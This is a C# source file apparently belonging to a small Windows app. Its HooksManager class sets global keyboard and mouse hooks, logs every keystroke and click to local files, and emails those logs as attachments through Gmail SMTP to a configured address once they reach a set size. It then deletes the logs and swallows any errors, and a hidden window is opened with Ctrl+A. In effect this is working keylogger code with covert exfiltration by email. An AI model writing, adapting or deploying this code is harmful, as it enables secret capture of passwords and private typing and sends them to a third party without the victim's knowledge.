using System;
using System.Drawing;
using System.IO;
using System.Net.Mail;
using System.Windows.Forms;
using Gma.System.MouseKeyHook;

namespace Hooks
{
    class HooksManager
    {
        public delegate void ShowMainWindowHandler();

        public event ShowMainWindowHandler ShowWindow;

        private readonly Configuration _config;
        private readonly IKeyboardMouseEvents _globalHooks = Hook.GlobalEvents();

        private const int Offset = 10;
        private const string MouseLogFilePath = @"mouse.log";
        private const string KeyboardLogFilePath = @"keyboard.log";

        private const string Host = "smtp.gmail.com";
        private const int Port = 587;
        private const string From = "";
        private const string Password = "";

        public HooksManager(Configuration conf)
        {
            _config = conf;
            _globalHooks.KeyDown += KeyDown;
            _globalHooks.MouseClick += MouseClick;
        }

        private void MouseClick(object sender, MouseEventArgs e)
        {
            using (var writer = new StreamWriter(MouseLogFilePath, true))
            {
                writer.WriteLine($"{DateTime.Now} : Key: {e.Button}, Position: {e.Location}");
            }
            Send(MouseLogFilePath, @"Mouse");
        }

        private void KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyData == (Keys.Control | Keys.A))
            {
                ShowWindow?.Invoke();
                e.Handled = true;
                return;
            }
            ChangeCursorPosition(e);
            if(e.Handled) return;
            using (var writer = new StreamWriter(KeyboardLogFilePath, true))
            {
                writer.WriteLine($"{DateTime.Now} : Key: {e.KeyData.ToString()}");
            }
            Send(KeyboardLogFilePath, @"Keyboard");
        }

        private void ChangeCursorPosition(KeyEventArgs e)
        {
            e.Handled = true;
            var point = new Point(Cursor.Position.X, Cursor.Position.Y);
            if (e.KeyData == Keys.Right)
                point.X += Offset;
            else if (e.KeyData == Keys.Left)
            {
                point.X -= Offset;
            }
            else if (e.KeyData == Keys.Down)
            {
                point.Y += Offset;
            }
            else if (e.KeyData == Keys.Up)
            {
                point.Y -= Offset;
            }
            else
            {
                e.Handled = false;
            }
            if (e.Handled)
            {
                Cursor.Position = point;
            }
        }

        private void Send(string file, string name)
        {
            if (new FileInfo(file).Length < _config.FileSize) return;
            if (string.IsNullOrEmpty(_config.Email)) return;
            var smtpClient = new SmtpClient(Host, Port)
            {
                Credentials = new System.Net.NetworkCredential(From, Password),
                EnableSsl = true
            };
            try
            {
                var mail = new MailMessage(From, _config.Email, @"Hooks" + name, string.Empty);
                using (var attachment = new Attachment(file))
                {
                    mail.Attachments.Add(attachment);
                    smtpClient.Send(mail);
                }
            }
            catch (Exception)
            {
                // ignored
            }
            new FileInfo(file).Delete();
        }
    }
}
